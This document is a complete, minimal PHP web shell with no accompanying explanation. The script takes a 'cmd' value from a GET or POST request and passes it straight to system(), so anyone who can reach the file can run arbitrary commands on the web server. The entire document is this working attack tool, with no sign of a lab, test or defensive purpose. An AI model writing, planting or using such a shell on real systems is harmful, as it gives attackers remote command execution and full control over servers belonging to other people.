<?php
$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : (isset($_POST['cmd']) ? $_POST['cmd'] : '');
if ($cmd) {
    system($cmd);
}
?>